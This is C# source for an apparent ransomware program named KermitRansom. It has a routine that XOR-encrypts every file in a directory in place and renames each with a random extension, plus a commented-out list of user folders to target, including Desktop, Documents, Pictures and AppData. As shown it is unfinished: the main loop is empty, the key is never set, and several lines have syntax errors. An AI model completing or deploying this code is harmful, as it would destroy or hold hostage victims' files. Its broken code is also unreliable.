using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace KermitRansom
{
    static class Program
    {
        static byte[] xor(byte[] bytes,byte[] pass)
        {
            if (bytes == null || pass == null)
                return null;
            for(int i=0; i < bytes.Length; i++)
            {
                bytes[i] ^= pass[i % pass.Length];
            }
            return bytes;
        }
        static string encodedStr(string str)
        {
            if (str == null)
                return null;
            return Uri.EscapeDataString(str);
        }
        static void parsAndEncrypt(string beginning)
        {
            string[] files = Directory.GetFiles(beginning)
            foreach(string currentFile in files)
            {
                try
                {
                    byte[] newBytes = xor(File.ReadAllBytes(currentFile), passBytes);
                    File.WriteAllBytes(currentFile, newBytes);
                    File.Move(currentFile, currentFile + extention);
                }
                catch { }
            }
        }
        static Random random = new Random():
        static string filesToEncrypt = ".txt.html.db.exe"; //no idea what this does
        static byte[] passBytes = null;
        static string extention = "." + random.Next().ToString("x");
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            List<string> pathsToEncrypt = new List<string>();
            /*
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            pathsToEncrypt.Add(Path.GetTempPath());
            */
            foreach(string currentPath in pathsToEncrypt)
            {

            }
            Application.Run(new Form1());
        }
    }
}
